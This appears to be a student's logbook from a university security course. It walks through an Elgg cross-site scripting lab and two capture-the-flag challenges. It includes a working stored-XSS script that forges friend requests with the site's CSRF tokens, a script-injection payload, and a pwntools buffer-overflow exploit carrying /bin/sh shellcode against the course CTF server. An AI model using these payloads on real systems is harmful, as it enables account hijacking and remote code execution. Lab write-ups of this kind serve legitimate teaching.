## Task 1

We did what was suggested and got an alert when accessing the user's profile.

[Logbook 10 - Task 1.1](/screenshots/logbook10-task1-1.png)

[Logbook 10 - Task 1.2](/screenshots/logbook10-task1-2.png)

## Task 2

We repeated the procedure of task 1, but now we replaced the alert's content with the user's cookie.

[Logbook 10 - Task 2.1](/screenshots/logbook10-task2-1.png)

[Logbook 10 - Task 2.2](/screenshots/logbook10-task2-2.png)

## Task 3

Once again we followed the instructions given: placed the script in the profile's description and opened a separate terminal to check if it worked. We got the cookie as expected.

[Logbook 10 - Task 3.1](/screenshots/logbook10-task3-1.png)

[Logbook 10 - Task 3.2](/screenshots/logbook10-task3-2.png)

## Task 4

First we used the firefox extension to inspect the request made to add a friend. We realized the request's url was /action/friends/add, and since it was a get request it was followed by the parameters we wanted to pass. In this case, what we assumed was the friends ID. We inspected Samy's user profile and realized his ID was 59, so we ended up with the following script:

```
window.onload = function(){
  var Ajax=null;
  var ts="&elgg_ts="+elgg.security.token.elgg_ts;
  var token="&elgg_token="+elgg.security.token.elgg_token;
  //Construct the HTTP request to add Samy as a friend.
  var sendurl="/action/friends/add?friend=59"+ts+token+ts+token;
  //Create and send Ajax request to add friend
  Ajax=new XMLHttpRequest();
  Ajax.open("GET", sendurl, true);
  Ajax.send();
}
```

With the script made, all that was left to do was place it in the user's profile. After accessing the user profile and checking the user's friend list we realized we were successful.

[Logbook 10 - Task 4.1](/screenshots/logbook10-task4-1.png)

[Logbook 10 - Task 4.2](/screenshots/logbook10-task4-2.png)

[Logbook 10 - Task 4.3](/screenshots/logbook10-task4-3.png)

## CTF

### Challenge 1

After inspecting the webpage we realized there was a vulnerability that allowed us to run a script by writing it in between script tags on the input available to beg for a flag. After realizing that, it was a matter of try and error until we got to the solution which was inserting the following script:

```<script>document.querySelector("#giveflag").click()</script>```

### Challenge 2

In this challenge the goal was to exploit the vulnerability in the gets() function, by using a buffer overflow to inject shellcode. To do this we used the address of the buffer which was provided during the execution of the program. We first analyzed the program to find the offset between the buffer's starting content and the return address, which was 108. Then we filled the buffer with a few NOPs for safety, followed by the shellcode and padding, until we got to the 108th byte, where the return address is located. There we placed the address of the buffer, so when the program tries to return, it goes to the location of our shellcode. Then it was a matter of executing our script:

```python
from pwn import *
import struct
import sys

p = remote("ctf-fsi.fe.up.pt", 4001)
p.recvline()
address_string = p.recvlineS()[-12:-2] # Retrieves the buffer's address from the program's output
address = int(address_string,16)
p.recvline()

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"
content = bytearray(0x90 for i in range(112))
content[20:(20+len(shellcode))]=(shellcode).encode('latin-1')
content[108:112]=(address).to_bytes(4,byteorder='little')

p.sendline(content)
p.interactive()

```

[Challenge 2](/screenshots/ctf10-2.png)